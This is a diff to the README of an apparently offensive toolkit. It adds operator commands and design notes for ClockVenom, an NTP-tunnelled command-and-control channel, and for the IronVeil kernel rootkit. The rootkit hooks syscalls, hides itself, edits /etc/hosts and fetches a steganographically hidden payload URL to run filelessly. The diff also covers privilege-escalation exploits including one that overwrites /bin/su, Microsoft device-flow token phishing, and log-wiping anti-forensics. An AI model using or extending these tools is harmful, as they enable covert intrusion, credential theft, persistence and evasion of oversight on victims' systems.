@@ -37,6 +37,13 @@ cd Modules/C2 && WORKER_URL=https://... C2_PSK=... python3 tui.py
 # NullRelay: deploy Cloudflare Worker dead-drop
 cd Modules/C2/cloudflare-worker && wrangler secret put WORKER_SECRET && wrangler deploy
 
+# ClockVenom: start NTP C2 server (requires root or CAP_NET_BIND_SERVICE for UDP/123)
+cd Modules/C2/ntp && pip install -r requirements.txt
+sudo C2_PSK=... python3 server.py
+
+# ClockVenom: print agent ID on target (no pip required)
+python3 Modules/C2/ntp/clockvenom.py --id
+
 # ShadowDrop: fileless binary execution via memfd_create
 python3 Modules/Dropper/shadowdrop_bin.py
 
@@ -49,8 +56,16 @@ python3 Modules/Dropper/shadowdrop_py.py
 # PhantomPage: Microsoft device flow 2FA bypass (serves phishing page)
 cd Modules/Phishing/deviceflowbypass2fa && pip install -r req.txt && python3 phantompage.py
 
-# IronVeil: build and load LKM rootkit
+# IronVeil: build and load LKM rootkit (requires linux-headers for current kernel)
+apt install linux-headers-$(uname -r)   # Debian/Ubuntu
+# pacman -S linux-headers               # Arch
 cd Modules/Rootkits && make && sudo insmod ironveil.ko
+# Note: build fails if the module path contains spaces — build from a symlinked path without spaces
+
+# IronVeil dead-drop: embed payload URL into stego PNG (run once, then host the PNG)
+python3 Modules/Rootkits/stego_embed.py <input_favicon.png> <payload_url> <output.png>
+# Verify extraction:
+python3 Modules/Rootkits/stego_embed.py --view <output.png>
 
 # Privesc: DirtyFrag exploit (CVE)
 cd Modules/Privesc/dirtyfrag && ./exp
@@ -60,6 +75,9 @@ cd Modules/Privesc/ssh-keysign-pwn && make && ./sshkeysign_pwn
 
 # Privesc: Fragnesia namespace wrapper (CVE-2026-46300)
 bash Modules/Privesc/fragnesia.sh
+
+# Privesc: CopyFail splice-based privilege escalation (requires Python ≥ 3.10)
+python3 Modules/Privesc/copyfail.py
 ```
 
 ## Architecture
@@ -102,9 +120,11 @@ _Limitations:_ task lost if agent crashes after GET before PUT result (re-queue 
 
 **Phishing** (`deviceflowbypass2fa/`): Microsoft OAuth 2.0 device authorization flow abuse. Flask server proxies requests to `login.microsoftonline.com/common/oauth2/v2.0/devicecode`, displays the user code via `outlook.html` phishing page, then polls for token completion to capture access + refresh tokens. Scope includes `offline_access` to obtain long-lived refresh tokens.
 
-**IronVeil** (`ironveil.c`): Linux LKM rootkit. Hooks `__NR_getdents64`, `__NR_getdents`, `__NR_kill` via syscall table patching (CR0.WP bypass with inline asm). Hides files prefixed `rootkit_`, runtime-controlled files/PIDs via `/proc/rootkit_ctrl` write-only interface. Self-hides from `lsmod` and `/sys/module/` at init. Supports kernels ≥ 4.17 (pt_regs ABI) and ≥ 5.7 (`kallsyms_lookup_name` via kprobe). No persistence across reboot; `rmmod` unavailable after self-hide by design.
+**IronVeil** (`ironveil.c`, `stego_embed.py`): Linux LKM rootkit. Hooks `__x64_sys_read`, `__x64_sys_getdents64`, `__x64_sys_kill` via **kretprobes** (requires `CONFIG_KPROBES`). At load: (1) injects NTP-to-C2 redirect IPs into `/etc/hosts` for ClockVenom redirection; (2) hooks `read()` to filter those IPs from every process except ones named `ntp-agent` (ClockVenom agent sets this name via `prctl(PR_SET_NAME)` before DNS resolution); (3) self-hides from `lsmod`, `/proc/modules`, `/sys/module/`. Runtime file/PID hiding via `/proc/rootkit_ctrl` (write-only, itself hidden); max 64 PIDs, 64 filenames. Files prefixed `rootkit_` auto-hidden. `rmmod` unavailable after self-hide; hooks survive until reboot. **Dead-drop resolver**: at load, schedules a delayed kernel workqueue (5s) that calls `call_usermodehelper` to spawn `python3` with an embedded fetcher script. The script: renames itself `kworker/0:1H` via `prctl`; sleeps 60–300s (random); fetches a PNG from `STEGO_IMG_URL`; walks PNG chunks to find `tEXt` keyword `X-Payload`; base64-decodes and XOR-decrypts (16-byte key, same as `stego_embed.py`) to recover the payload URL; double-forks and execs the payload fileless via `memfd_create`. Operator workflow: run `stego_embed.py` to embed URL into a PNG, host it publicly, set `STEGO_IMG_URL` + `PYTHON3_PATH` in `ironveil.c`, rebuild. Build prereq: `linux-headers-$(uname -r)`. Kernel compat: ≥ 6.1 with BHI mitigations (kretprobe on `x64_sys_call`), 5.7–6.x (kallsyms via kprobe), 4.x–5.6 (kallsyms exported directly). Tested on Debian 12, kernel 6.1.0-49-amd64. Bypasses: `mmap()` and `pread64()` on `/etc/hosts` not hooked — true content readable. File hiding blocks `getdents` only; direct path access (`cat /path/file`) unaffected.
 
-**Privesc** (`dirtyfrag/`, `ssh-keysign-pwn/`, `fragnesia.sh`): Three exploits. `dirtyfrag` targets CVE via fragmented memory. `ssh-keysign-pwn` abuses `ssh-keysign` SUID binary. `fragnesia.sh` is a user+network namespace wrapper for CVE-2026-46300 that sets up the unprivileged namespace environment before running the compiled exploit.
+**ClockVenom** (`ntp/clockvenom.py`, `ntp/server.py`): NTP-tunnelled C2. Agent resolves its distro's default NTP domain (e.g. `ntp.ubuntu.com`) — operator compromises `/etc/hosts` on target to redirect that domain to the C2 server. Commands and results are hidden in NTS Cookie extension fields (type `0x0104`, RFC 8915) of standard NTP Mode-3/4 packets; clean 48-byte requests sent when idle. Encryption same AES-256-GCM + PBKDF2-SHA256 scheme as NullRelay. Server binds UDP/123 (requires root) + FastAPI admin HTTP on `127.0.0.1:1338`; `operator_cli.py` and `tui.py` work against it unchanged. Env vars: `C2_PSK`, `C2_DB` (`ntp_c2.db`), `C2_ADMIN` (`1338`), `C2_DEBUG`.
+
+**Privesc** (`dirtyfrag/`, `ssh-keysign-pwn/`, `fragnesia.sh`, `copyfail.py`): Four exploits. `dirtyfrag` targets CVE via fragmented memory. `ssh-keysign-pwn` abuses `ssh-keysign` SUID binary (also includes `chage_pwn.c` and `exploit_vuln_target.c`). `fragnesia.sh` sets up a user+network namespace (CVE-2026-46300 prerequisite) via `unshare --user --map-root-user --net` and drops into an interactive shell ready to run the actual exploit — it is the namespace wrapper, not the exploit binary itself. `copyfail.py` implements splice-based arbitrary-write via AF_ALG + KTLS socket (ctypes `libc.splice()`), overwrites `/bin/su` in-place kernel-copy-style, then calls `os.system("su")`; requires Python ≥ 3.10.
 
 **EchoErase — ghost-shell** (`echoerase_ghost.sh`): Five phases: (1) disable kernel auditing (`auditctl -e 0`) + stop auditbeat; (2) erase utmp/wtmp entries for current TTY via `utmpdump -r`; (3) zero lastlog for current UID via `dd` (seek to `uid * 292`); (4) scrub environment variables (SSH_*, SUDO_*, terminal fingerprints); (5) exec shell spoofed as `[kworker/u:0]` via `exec -a`. `trap EXIT` restores audit rules. Limitation: `/proc/<PID>/exe` still points to real bash.
 
